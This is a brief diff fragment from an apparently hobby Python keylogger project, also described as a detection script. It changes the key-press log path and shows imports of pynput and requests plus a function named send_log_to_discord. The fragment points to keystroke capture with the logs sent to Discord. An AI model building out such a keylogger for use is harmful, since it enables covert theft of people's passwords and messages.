@@ -4,7 +4,7 @@ import requests
 from pynput import keyboard
 
 # key logging variables including file path to log file
-log_file = "key_presses.txt"
+log_file = "Python/Projects/Keylogger-and-Detection-Script/key_presses.txt"
 keys_pressed = "" 
 
 def send_log_to_discord():
